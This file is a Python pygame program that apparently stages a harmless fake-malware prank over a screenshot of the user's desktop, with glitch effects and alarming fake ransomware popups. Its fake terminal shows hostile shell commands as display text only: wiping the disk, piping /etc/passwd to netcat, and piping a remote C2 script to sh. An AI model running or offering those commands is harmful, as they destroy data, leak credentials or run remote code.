import pygame
import random
import sys
import os
import math
from PIL import ImageGrab

# ── Configuration ──────────────────────────────────────────────────────────────
FPS                     = 60
PHASE_DURATION          = 7000   # ms per visual phase
DOUBLE_CLICK_TIME       = 500    # ms window for double-click
SURFACE_UPDATE_INTERVAL = 120    # frames between work_surface snapshots
MELT_STRIPS             = 15
CHAOS_THRESHOLD         = 0.60
SHAKE_MAX               = 10     # max pixel offset during chaos shake
BOOT_CHARS_PER_FRAME    = 2      # characters typed per frame in boot screen

# ── Palette ────────────────────────────────────────────────────────────────────
COLORS = {
    'bg':          (240, 240, 240),
    'border':      (30, 144, 255),
    'accent':      (255, 69, 0),
    'text':        (255, 255, 255),
    'text_shadow': (0, 0, 0, 150),
    'grid':        (100, 100, 100),
    'term_bg':     (0, 10, 0),
    'term_bright': (0, 255, 70),
    'term_dim':    (0, 160, 40),
}

BOOT_SCRIPT = [
    "> HYDROGEN v2.4.1 initializing...",
    "> Scanning system processes...             [ OK ]",
    "> Loading kernel modules...                [ OK ]",
    "> Mapping memory addresses...              [ OK ]",
    "> Bypassing firewall...                    [ WARNING ]",
    "> Escalating privileges...                 [ OK ]",
    "> Root access granted.",
    "> Injecting payload into system32...",
    "> Disabling antivirus...                   [ OK ]",
    "> Payload armed.  Awaiting trigger.        [ READY ]",
]

TERMINAL_FEED = [
    "rm -rf /System/Library/CoreServices/*",
    "chmod 777 /etc/sudoers",
    "cat /etc/passwd | nc 10.0.0.1 4444",
    "ACCESSING: 0xFFFF8000A1B3C2D4",
    "dd if=/dev/urandom of=/dev/disk0 bs=1M",
    "killall -9 Finder WindowServer",
    "DECRYPT: AES-256 master key located",
    "UPLOAD: user_data.db [2.4 GB] -> remote",
    "KERNEL PANIC: attempting recovery...",
    "sudo rm -rf / --no-preserve-root",
    "ROOTKIT: installed at /System/.hydrogen",
    "EXFIL: 47,291 files transferred",
    "BYPASS: System Integrity Protection disabled",
    "Wiping secure enclave...",
    "ssh root@10.0.0.1 'curl http://c2.dark | sh'",
    "crontab -r && echo '@reboot hydrogen' | crontab",
    "Opening backdoor on port 31337...",
    "Keylogger activated.",
    "Webcam feed: streaming to remote...",
    "ENCRYPT: /Users/ complete — 4,204 files locked",
]

POPUPS = [
    ("CRITICAL ERROR",
     "A fatal exception 0E has occurred\nat 0028:C0011E36 in VXD VMM(01).\nThe current application will be\nterminated.",
     "   OK   "),
    ("SYSTEM WARNING",
     "Your computer has been compromised.\nAll files are being encrypted.\nDo not turn off your machine.",
     " Dismiss "),
    ("KERNEL PANIC",
     "Unrecoverable error in kernel\nmodule: hydrogen.sys\nSystem integrity violated.",
     "   OK   "),
    ("HYDROGEN 2.4",
     "Payload execution complete.\n4,204 files processed.\nBackup has been deleted.",
     "  Close  "),
    ("SECURITY ALERT",
     "Unauthorized access detected.\nFirewall has been disabled.\nFile encryption in progress...",
     "   OK   "),
]


class FullHydrogenSimulation:
    def __init__(self):
        try:
            pygame.init()
        except Exception as e:
            print(f"Failed to initialize Pygame: {e}")
            sys.exit(1)

        try:
            self.screenshot = ImageGrab.grab(all_screens=True)
        except Exception as e:
            print(f"Failed to capture screen: {e}")
            sys.exit(1)

        self.info   = pygame.display.Info()
        self.width  = self.info.current_w
        self.height = self.info.current_h

        os.environ['SDL_VIDEO_WINDOW_POS'] = "0,0"
        self.screen = pygame.display.set_mode((self.width, self.height), pygame.NOFRAME)
        pygame.display.set_caption("Hydrogen Full Simulation")

        try:
            self.bg_surface = pygame.image.fromstring(
                self.screenshot.tobytes(), self.screenshot.size, self.screenshot.mode
            ).convert()
        except Exception as e:
            print(f"Failed to convert screenshot to surface: {e}")
            sys.exit(1)

        self.work_surface = self.bg_surface.copy()

        # ── Fonts ──────────────────────────────────────────────────────────────
        self.font_ui          = pygame.font.SysFont("arial", 14, bold=True)
        self.font_mono        = pygame.font.SysFont("courier", 15)
        self.font_mono_sm     = pygame.font.SysFont("courier", 13)
        self.font_popup       = pygame.font.SysFont("arial", 13)
        self.font_popup_title = pygame.font.SysFont("arial", 13, bold=True)

        # ── Timing ─────────────────────────────────────────────────────────────
        self.clock       = pygame.time.Clock()
        self.running     = True
        self.frame_count = 0
        self.start_ticks = 0

        # ── State machine: boot → desktop → payload ────────────────────────────
        self.state           = "boot"
        self.last_click_time = 0

        # ── Desktop icon ───────────────────────────────────────────────────────
        self.icon_rect = pygame.Rect(40, 40, 70, 70)

        # ── Scroll offsets (shared by scroll and chaos) ────────────────────────
        self.scroll_x = 0
        self.scroll_y = 0

        # ── Phases ─────────────────────────────────────────────────────────────
        self.phases = [
            "scroll", "melt", "chromatic", "wave",
            "terminal", "static", "tunnel", "chaos", "calm_flash",
        ]

        # ── Flash cycle — incremented ONCE per frame in run() ──────────────────
        self.flash_cycle    = 0
        self.soft_colors    = [
            (100, 150, 200, 100),
            (150, 100, 200, 100),
            (200, 150, 100, 100),
            (100, 200, 150, 100),
        ]
        self.intense_colors = [
            (255, 150,   0, 180),
            (150,   0, 255, 180),
            (  0, 200, 255, 180),
            (255,   0, 150, 180),
        ]

        # ── Pre-allocated surfaces (avoid per-frame alloc) ─────────────────────
        self.flash_overlay_surf = pygame.Surface((self.width, self.height), pygame.SRCALPHA)
        self.noise_surf         = pygame.Surface((self.width, self.height), pygame.SRCALPHA)
        self.tunnel_temp        = pygame.Surface((self.width, self.height))

        # Pre-allocate glow surfaces for calm_flash (fixed size, no jitter)
        GLOW_SIZE = 80
        self.glow_surfs = [
            pygame.Surface((GLOW_SIZE * 2, GLOW_SIZE * 2), pygame.SRCALPHA)
            for _ in range(5)
        ]
        self.glow_size = GLOW_SIZE

        # Pre-computed RGB channel surfaces for chromatic aberration
        self.ch_r = self.bg_surface.copy()
        self.ch_r.fill((0, 255, 255), special_flags=pygame.BLEND_RGB_SUB)  # keep only R

        self.ch_g = self.bg_surface.copy()
        self.ch_g.fill((255, 0, 255), special_flags=pygame.BLEND_RGB_SUB)  # keep only G

        self.ch_b = self.bg_surface.copy()
        self.ch_b.fill((255, 255, 0), special_flags=pygame.BLEND_RGB_SUB)  # keep only B

        # ── Boot sequence state ────────────────────────────────────────────────
        self.boot_line_idx   = 0
        self.boot_char_idx   = 0
        self.boot_complete   = False
        self.boot_done_frame = None

        # ── Terminal phase state ───────────────────────────────────────────────
        self.term_lines        = []
        self.term_feed_idx     = 0
        self.term_char_pos     = 0
        self.term_current_line = ""
        self.term_delay        = 0

        # ── Popup state ────────────────────────────────────────────────────────
        self.active_popups = []  # [popup_idx, x, y, created_frame]
        self.popup_cd      = 0   # countdown until next popup spawn

    # ── Phase resolution ───────────────────────────────────────────────────────
    def get_current_phase(self, current_time):
        idx = (current_time // PHASE_DURATION) % len(self.phases)
        return self.phases[idx]

    # ── Desktop icon ───────────────────────────────────────────────────────────
    def draw_desktop_icon(self):
        self.screen.blit(self.bg_surface, (0, 0))
        pygame.draw.rect(self.screen, COLORS['bg'],     self.icon_rect, border_radius=8)
        pygame.draw.rect(self.screen, COLORS['border'], self.icon_rect, 3, border_radius=8)
        cx, cy = self.icon_rect.centerx, self.icon_rect.centery
        pygame.draw.circle(self.screen, COLORS['accent'], (cx, cy - 5), 10)
        pygame.draw.circle(self.screen, COLORS['border'], (cx + 12, cy + 8), 5)
        pygame.draw.line(self.screen, COLORS['grid'], (cx, cy - 5), (cx + 12, cy + 8), 2)
        text_surf = self.font_ui.render("hydrogen", True, COLORS['text'])
        text_bg   = pygame.Surface((text_surf.get_width() + 10, text_surf.get_height() + 4), pygame.SRCALPHA)
        text_bg.fill(COLORS['text_shadow'])
        bg_x = cx - text_bg.get_width() // 2
        bg_y = self.icon_rect.bottom + 8
        self.screen.blit(text_bg,   (bg_x, bg_y))
        self.screen.blit(text_surf, (bg_x + 5, bg_y + 2))

    # ── Boot screen ────────────────────────────────────────────────────────────
    def draw_boot_screen(self):
        """Green-on-black fake terminal that types the boot script before the icon appears."""
        self.screen.fill((0, 0, 0))

        if not self.boot_complete:
            self.boot_char_idx += BOOT_CHARS_PER_FRAME
            line = BOOT_SCRIPT[self.boot_line_idx]
            if self.boot_char_idx >= len(line):
                self.boot_char_idx = len(line)
                if self.frame_count % 8 == 0:  # brief pause between lines
                    self.boot_line_idx += 1
                    self.boot_char_idx  = 0
                    if self.boot_line_idx >= len(BOOT_SCRIPT):
                        self.boot_complete   = True
                        self.boot_done_frame = self.frame_count

        x   = 60
        y0  = 80
        lh  = self.font_mono.get_height() + 4

        for i in range(min(self.boot_line_idx, len(BOOT_SCRIPT))):
            surf = self.font_mono.render(BOOT_SCRIPT[i], True, COLORS['term_dim'])
            self.screen.blit(surf, (x, y0 + i * lh))

        if not self.boot_complete and self.boot_line_idx < len(BOOT_SCRIPT):
            partial = BOOT_SCRIPT[self.boot_line_idx][:self.boot_char_idx]
            cursor  = "_" if (self.frame_count // 15) % 2 == 0 else " "
            surf    = self.font_mono.render(partial + cursor, True, COLORS['term_bright'])
            self.screen.blit(surf, (x, y0 + self.boot_line_idx * lh))

        if self.boot_complete and self.boot_done_frame and (self.frame_count - self.boot_done_frame) > 90:
            self.state = "desktop"

    # ── Visual effects ─────────────────────────────────────────────────────────
    def effect_scroll(self):
        self.scroll_x = (self.scroll_x + 4) % self.width
        self.scroll_y = (self.scroll_y + 2) % self.height
        self.screen.blit(self.work_surface, (self.scroll_x,              self.scroll_y))
        self.screen.blit(self.work_surface, (self.scroll_x - self.width, self.scroll_y))
        self.screen.blit(self.work_surface, (self.scroll_x,              self.scroll_y - self.height))
        self.screen.blit(self.work_surface, (self.scroll_x - self.width, self.scroll_y - self.height))
        self._add_calm_flash_overlay(0.3)

    def effect_melt(self):
        self.screen.blit(self.bg_surface, (0, 0))
        for _ in range(MELT_STRIPS):
            sw = random.randint(10, 40)
            sx = random.randint(0, max(1, self.width - sw))
            dy = random.randint(2, 8)
            sh = self.height - dy
            if sh > 0:
                slab = pygame.Surface((sw, sh))
                slab.blit(self.bg_surface, (0, 0), (sx, 0, sw, sh))
                self.screen.blit(slab, (sx, dy))
        self._add_calm_flash_overlay(0.35)

    def effect_chromatic(self):
        """Split the R, G, B channels apart for a classic glitch look."""
        offset = int(6 * math.sin(self.frame_count * 0.08)) + random.randint(-2, 2)
        self.screen.fill((0, 0, 0))
        self.screen.blit(self.ch_r, (-offset * 2, random.randint(-1, 1)), special_flags=pygame.BLEND_RGB_ADD)
        self.screen.blit(self.ch_g, (0, 0),                               special_flags=pygame.BLEND_RGB_ADD)
        self.screen.blit(self.ch_b, ( offset * 2, random.randint(-1, 1)), special_flags=pygame.BLEND_RGB_ADD)
        self._add_calm_flash_overlay(0.25)

    def effect_wave(self):
        self.screen.fill((0, 0, 0))
        amplitude  = 25
        frequency  = 0.05
        row_height = 4
        for y in range(0, self.height, row_height):
            dx = int(amplitude * math.sin(frequency * y + self.frame_count * 0.2))
            self.screen.blit(self.bg_surface, (dx, y), (0, y, self.width, row_height))
        self._add_calm_flash_overlay(0.4)

    def effect_terminal(self):
        """Full-screen fake hacking terminal with scrolling commands."""
        self.screen.fill(COLORS['term_bg'])

        # Advance typing
        if self.term_delay > 0:
            self.term_delay -= 1
        else:
            if not self.term_current_line:
                self.term_current_line = TERMINAL_FEED[self.term_feed_idx % len(TERMINAL_FEED)]
                self.term_char_pos = 0
            self.term_char_pos += 3
            if self.term_char_pos >= len(self.term_current_line):
                self.term_lines.append(self.term_current_line)
                if len(self.term_lines) > 22:
                    self.term_lines.pop(0)
                self.term_feed_idx    += 1
                self.term_current_line = ""
                self.term_char_pos     = 0
                self.term_delay        = random.randint(4, 18)

        # Header bar
        pygame.draw.rect(self.screen, COLORS['term_bright'], (0, 0, self.width, 26))
        header = self.font_mono_sm.render(
            "  HYDROGEN TERMINAL v2.4.1 — LIVE SESSION", True, COLORS['term_bg']
        )
        self.screen.blit(header, (0, 5))

        # Completed lines
        lh    = self.font_mono_sm.get_height() + 3
        max_v = (self.height - 70) // lh
        vis   = self.term_lines[-max_v:]
        y     = 36
        for line in vis:
            surf = self.font_mono_sm.render(line, True, COLORS['term_dim'])
            self.screen.blit(surf, (20, y))
            y += lh

        # Currently-typing line
        if self.term_current_line:
            partial = self.term_current_line[:self.term_char_pos]
            cursor  = "_" if (self.frame_count // 15) % 2 == 0 else " "
            surf    = self.font_mono_sm.render("$ " + partial + cursor, True, COLORS['term_bright'])
            self.screen.blit(surf, (20, y))

    def effect_static(self):
        """Corrupted TV signal — scanline displacement plus white noise."""
        self.screen.blit(self.bg_surface, (0, 0))

        for _ in range(random.randint(30, 70)):
            gy = random.randint(0, self.height - 5)
            gh = min(random.randint(1, 4), self.height - gy)
            dx = random.randint(-50, 50)
            sx = max(0, -dx)
            gx = max(0, dx)
            gw = self.width - abs(dx)
            if gw > 0 and gh > 0:
                self.screen.blit(self.bg_surface, (gx, gy), (sx, gy, gw, gh))

        self.noise_surf.fill((0, 0, 0, 0))
        for _ in range(150):
            nx    = random.randint(0, self.width  - 1)
            ny    = random.randint(0, self.height - 1)
            nw    = random.randint(3, 20)
            nh    = random.randint(1, 3)
            gray  = random.randint(160, 255)
            alpha = random.randint(80, 180)
            pygame.draw.rect(self.noise_surf, (gray, gray, gray, alpha), (nx, ny, nw, nh))
        self.screen.blit(self.noise_surf, (0, 0))

    def effect_tunnel(self):
        sf     = 0.98
        new_w  = int(self.width  * sf)
        new_h  = int(self.height * sf)
        shrunk = pygame.transform.smoothscale(self.screen, (new_w, new_h))
        if self.frame_count % 3 == 0:
            shrunk = pygame.transform.rotate(shrunk, random.choice([-2, -1, 1, 2]))
            new_w, new_h = shrunk.get_size()
        xp = (self.width  - new_w) // 2
        yp = (self.height - new_h) // 2
        self.tunnel_temp.blit(self.bg_surface, (0, 0))
        self.tunnel_temp.blit(shrunk, (xp, yp))
        self.screen.blit(self.tunnel_temp, (0, 0))
        self._add_calm_flash_overlay(0.25)

    def effect_chaos(self):
        """Max mayhem: shake + scroll glitches + color inversion + popups + intense flash."""
        sx = random.randint(-SHAKE_MAX, SHAKE_MAX)
        sy = random.randint(-SHAKE_MAX, SHAKE_MAX)

        if random.random() > 0.5:
            self.scroll_x = (self.scroll_x + 4) % self.width
            self.scroll_y = (self.scroll_y + 2) % self.height
            self.screen.blit(self.work_surface, (self.scroll_x + sx,              self.scroll_y + sy))
            self.screen.blit(self.work_surface, (self.scroll_x - self.width + sx, self.scroll_y + sy))
            self.screen.blit(self.work_surface, (self.scroll_x + sx,              self.scroll_y - self.height + sy))
            self.screen.blit(self.work_surface, (self.scroll_x - self.width + sx, self.scroll_y - self.height + sy))
        else:
            self.screen.blit(self.bg_surface, (sx, sy))

        if random.random() > CHAOS_THRESHOLD:
            rw = random.randint(100, 500)
            rh = random.randint(100, 400)
            rx = random.randint(0, max(1, self.width  - rw))
            ry = random.randint(0, max(1, self.height - rh))
            if rx + rw <= self.width and ry + rh <= self.height:
                glitch = self.screen.subsurface((rx, ry, rw, rh)).copy()
                mask   = pygame.Surface((rw, rh))
                mask.fill((255, 255, 255))
                glitch.blit(mask, (0, 0), special_flags=pygame.BLEND_RGB_SUB)
                self.screen.blit(glitch, (rx + random.randint(-50, 50), ry + random.randint(-10, 10)))

        self._update_and_draw_popups()
        self._draw_intense_flash_overlay()

    def effect_calm_flash(self):
        """Gentle pulsing orbs — safe 2 Hz, no random size jitter."""
        self.screen.blit(self.bg_surface, (0, 0))
        alpha_base = int(80 + 70 * math.sin(self.flash_cycle * math.pi / 15))
        ls         = self.glow_size
        positions  = [
            (self.width * 0.2, self.height * 0.2),
            (self.width * 0.8, self.height * 0.2),
            (self.width * 0.5, self.height * 0.5),
            (self.width * 0.2, self.height * 0.8),
            (self.width * 0.8, self.height * 0.8),
        ]
        for i, (px, py) in enumerate(positions):
            color_idx = (i + self.frame_count // 15) % len(self.soft_colors)
            sc        = self.soft_colors[color_idx]
            glow      = self.glow_surfs[i]
            glow.fill((0, 0, 0, 0))
            for r in range(ls, 0, -4):
                a = int(alpha_base * (ls - r) / ls)
                pygame.draw.circle(glow, (*sc[:3], a), (ls, ls), r)
            self.screen.blit(glow, (int(px - ls), int(py - ls)))

    # ── Overlay helpers ────────────────────────────────────────────────────────
    def _add_calm_flash_overlay(self, intensity=0.5):
        base  = int(100 * intensity)
        alpha = int(base * (0.5 + 0.5 * math.sin(self.flash_cycle * math.pi / 15)))
        if alpha > 0:
            ci = (self.frame_count // 15) % len(self.soft_colors)
            sc = self.soft_colors[ci]
            self.flash_overlay_surf.fill((*sc[:3], alpha))
            self.screen.blit(self.flash_overlay_surf, (0, 0))

    def _draw_intense_flash_overlay(self):
        ff    = self.frame_count % 15
        alpha = int(150 * ff / 7) if ff < 7 else int(150 * (15 - ff) / 8)
        if alpha <= 0:
            return
        ci      = (self.frame_count // 5) % len(self.intense_colors)
        r, g, b, _ = self.intense_colors[ci]
        self.flash_overlay_surf.fill((0, 0, 0, 0))
        for rect in [
            (0,                          0,                           self.width // 3, self.height // 3),
            (self.width - self.width//3, 0,                           self.width // 3, self.height // 3),
            (self.width // 3,            self.height - self.height//3, self.width // 3, self.height // 3),
            (self.width // 2 - 100,      self.height // 2 - 100,      200,             200),
        ]:
            pygame.draw.rect(self.flash_overlay_surf, (r, g, b, alpha), rect)
        self.screen.blit(self.flash_overlay_surf, (0, 0))

    # ── Popup helpers ──────────────────────────────────────────────────────────
    def _update_and_draw_popups(self):
        if self.popup_cd <= 0 and len(self.active_popups) < 5:
            idx = random.randint(0, len(POPUPS) - 1)
            px  = random.randint(50, max(51, self.width  - 410))
            py  = random.randint(50, max(51, self.height - 215))
            self.active_popups.append([idx, px, py, self.frame_count])
            self.popup_cd = random.randint(40, 100)
        else:
            self.popup_cd -= 1

        self.active_popups = [p for p in self.active_popups if self.frame_count - p[3] < 300]

        for idx, px, py, _ in self.active_popups:
            self._draw_popup(POPUPS[idx % len(POPUPS)], px, py)

    def _draw_popup(self, popup, x, y):
        title, body, btn_label = popup
        w, h = 380, 190

        # Window body + beveled border
        pygame.draw.rect(self.screen, (192, 192, 192), (x, y, w, h))
        pygame.draw.rect(self.screen, (255, 255, 255), (x,     y,     w, h), 1)
        pygame.draw.rect(self.screen, (128, 128, 128), (x + 1, y + h - 1, w - 1, 1))
        pygame.draw.rect(self.screen, (128, 128, 128), (x + w - 1, y + 1, 1, h - 1))

        # Title bar
        pygame.draw.rect(self.screen, (0, 0, 128), (x, y, w, 22))
        self.screen.blit(
            self.font_popup_title.render(title, True, (255, 255, 255)), (x + 6, y + 4)
        )

        # Close button (Win95 style)
        bx, by = x + w - 18, y + 3
        pygame.draw.rect(self.screen, (192, 192, 192), (bx, by, 16, 16))
        pygame.draw.rect(self.screen, (255, 255, 255), (bx, by, 16, 16), 1)
        pygame.draw.rect(self.screen, (128, 128, 128), (bx + 1, by + 15, 15, 1))
        pygame.draw.rect(self.screen, (128, 128, 128), (bx + 15, by + 1, 1, 15))
        self.screen.blit(self.font_popup_title.render("X", True, (0, 0, 0)), (bx + 3, by + 1))

        # Error icon
        pygame.draw.circle(self.screen, (255, 0, 0), (x + 32, y + 75), 16)
        self.screen.blit(
            self.font_popup_title.render("!", True, (255, 255, 255)), (x + 29, y + 65)
        )

        # Body text
        for i, line in enumerate(body.split('\n')):
            self.screen.blit(
                self.font_popup.render(line, True, (0, 0, 0)), (x + 58, y + 42 + i * 18)
            )

        # Button
        bw    = self.font_popup.size(btn_label)[0] + 16
        btn_x = x + (w - bw) // 2
        btn_y = y + h - 36
        pygame.draw.rect(self.screen, (192, 192, 192), (btn_x, btn_y, bw, 22))
        pygame.draw.rect(self.screen, (255, 255, 255), (btn_x,     btn_y,      bw, 22), 1)
        pygame.draw.rect(self.screen, (128, 128, 128), (btn_x + 1, btn_y + 21, bw - 1, 1))
        pygame.draw.rect(self.screen, (128, 128, 128), (btn_x + bw - 1, btn_y + 1, 1, 21))
        self.screen.blit(
            self.font_popup.render(btn_label, True, (0, 0, 0)), (btn_x + 8, btn_y + 4)
        )

    # ── Main loop ──────────────────────────────────────────────────────────────
    def run(self):
        while self.running:
            current_ticks    = pygame.time.get_ticks()
            self.frame_count += 1
            self.flash_cycle  = (self.flash_cycle + 1) % 30  # single increment per frame

            for event in pygame.event.get():
                if event.type == pygame.QUIT:
                    self.running = False
                if event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE:
                    self.running = False
                if self.state == "desktop" and event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                    if self.icon_rect.collidepoint(event.pos):
                        dt = current_ticks - self.last_click_time
                        if dt < DOUBLE_CLICK_TIME:
                            self.state       = "payload"
                            self.start_ticks = pygame.time.get_ticks()
                        else:
                            self.last_click_time = current_ticks

            if self.state == "boot":
                self.draw_boot_screen()

            elif self.state == "desktop":
                self.draw_desktop_icon()

            elif self.state == "payload":
                elapsed = current_ticks - self.start_ticks
                phase   = self.get_current_phase(elapsed)

                if   phase == "scroll":     self.effect_scroll()
                elif phase == "melt":       self.effect_melt()
                elif phase == "chromatic":  self.effect_chromatic()
                elif phase == "wave":       self.effect_wave()
                elif phase == "terminal":   self.effect_terminal()
                elif phase == "static":     self.effect_static()
                elif phase == "tunnel":     self.effect_tunnel()
                elif phase == "chaos":      self.effect_chaos()
                elif phase == "calm_flash": self.effect_calm_flash()

                if (self.frame_count % SURFACE_UPDATE_INTERVAL == 0
                        and phase not in {"tunnel", "calm_flash", "terminal", "chromatic"}):
                    self.work_surface.blit(self.screen, (0, 0))

            pygame.display.flip()
            self.clock.tick(FPS)

        self.cleanup()

    def cleanup(self):
        try:
            pygame.quit()
        except Exception as e:
            print(f"Error during cleanup: {e}")
        finally:
            sys.exit()


if __name__ == "__main__":
    sim = FullHydrogenSimulation()
    sim.run()
